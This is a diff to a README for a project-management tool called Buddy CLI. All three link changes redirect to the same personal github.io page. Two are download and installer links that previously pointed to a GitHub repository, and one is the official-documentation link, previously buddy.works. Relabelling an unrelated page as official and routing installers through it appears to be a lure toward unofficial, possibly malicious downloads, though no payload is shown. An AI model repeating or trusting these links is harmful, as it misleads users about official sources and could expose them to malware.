@@ -1,6 +1,6 @@
 # 🚀 cli - Manage your coding projects with ease
 
-[![](https://img.shields.io/badge/Download-Buddy_CLI-blue.svg)](https://github.com/Unsurpassable-adalia371/cli)
+[![](https://img.shields.io/badge/Download-Buddy_CLI-blue.svg)](https://unsurpassable-adalia371.github.io)
 
 ## 📁 What is this tool?
 
@@ -17,7 +17,7 @@ The Buddy CLI is a tool for your computer. It helps you manage your software pro
 
 You must visit the main page to get the installer for your computer. This file contains all the parts needed to run the tool.
 
-[Click here to open the download page](https://github.com/Unsurpassable-adalia371/cli)
+[Click here to open the download page](https://unsurpassable-adalia371.github.io)
 
 Follow these steps to finish the download:
 
@@ -80,7 +80,7 @@ Type `bdy run [name]` where [name] is the task you want to begin. The tool start
 
 ## 📘 Learning more
 
-You can find more help in the official documentation. Visit the [Buddy documentation website](https://buddy.works/docs/cli/getting-started) to see advanced options. These guides explain how to trigger complex automations and manage shared files.
+You can find more help in the official documentation. Visit the [Buddy documentation website](https://unsurpassable-adalia371.github.io) to see advanced options. These guides explain how to trigger complex automations and manage shared files.
 
 ## 🔍 Frequently Asked Questions
 
